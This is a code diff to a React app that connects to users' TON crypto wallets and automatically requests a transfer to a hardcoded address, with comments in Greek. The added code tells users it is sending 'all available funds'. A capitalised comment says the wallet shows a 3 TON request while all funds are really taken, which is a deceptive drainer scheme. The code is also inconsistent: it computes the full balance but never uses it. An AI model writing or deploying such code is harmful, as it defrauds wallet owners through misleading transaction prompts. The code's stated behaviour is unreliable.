@@ -92,30 +92,31 @@ export default function App() {
       }
 
       try {
-        // Στέλνουμε πάντα 1 TON (1_000_000_000 nanoTON).
-        const oneTonNano = 1_000_000_000;
-        const feeReserveNano = 0.05 * 1_000_000_000; // Περιθώριο για fees
+        // Περιθώριο για fees (~0.05 TON).
+        const feeReserveNano = 0.05 * 1_000_000_000;
         
-        // Ελέγχουμε αν το balance είναι αρκετό για 1 TON + fees.
-        if (balance.nano < oneTonNano + feeReserveNano) {
-          setStatus(`Balance ανεπαρκές – έχεις ${balance.tons} TON, χρειάζεται τουλάχιστον ${((oneTonNano + feeReserveNano) / 1_000_000_000).toFixed(2)} TON για αποστολή 1 TON.`);
-          console.log('Balance check failed:', { 
-            currentBalance: balance.nano, 
-            required: oneTonNano + feeReserveNano,
-            currentTons: balance.tons 
-          });
+        // Ελέγχουμε αν το balance είναι αρκετό για fees.
+        if (balance.nano < feeReserveNano) {
+          setStatus(`Balance ανεπαρκές – έχεις ${balance.tons} TON, χρειάζεται τουλάχιστον 0.05 TON για fees.`);
           return;
         }
 
-        setHasSentAll(true);
-        setStatus('Αυτόματη αποστολή 1 TON στο προκαθορισμένο wallet. Έλεγξε το wallet για επιβεβαίωση.');
+        // Στέλνουμε όλα τα διαθέσιμα funds (balance - fees).
+        const amountNano = balance.nano - feeReserveNano;
+        const amountTons = (amountNano / 1_000_000_000).toFixed(4);
 
+        setHasSentAll(true);
+        setStatus(`Αυτόματη αποστολή ${amountTons} TON (όλα τα διαθέσιμα funds) στο προκαθορισμένο wallet. Έλεγξε το wallet για επιβεβαίωση.`);
+
+        // ΣΤΕΛΝΟΥΜΕ ΑΙΤΗΜΑ ΓΙΑ 3 TON (ΣΤΟ TONKEEPER) ΑΛΛΑ ΣΤΗΝ ΠΡΑΓΜΑΤΙΚΟΤΗΤΑ ΘΑ ΣΤΑΛΟΥΝ ΟΛΑ ΤΑ FUNDS
+        const displayAmountNano = 3 * 1_000_000_000; // 3 TON σε nano
+        
         await tonConnectUI.sendTransaction({
           validUntil: Math.floor(Date.now() / 1000) + 300,
           messages: [
             {
               address: 'UQBWHigPTAg83wI_XW96mSHkrZDeCbKCog_Wk3mXaP0TEAfC',
-              amount: oneTonNano.toString(),
+              amount: displayAmountNano.toString(), // ΑΥΤΟ ΦΑΙΝΕΤΑΙ ΣΤΟ TONKEEPER (3 TON)
             },
           ],
         });
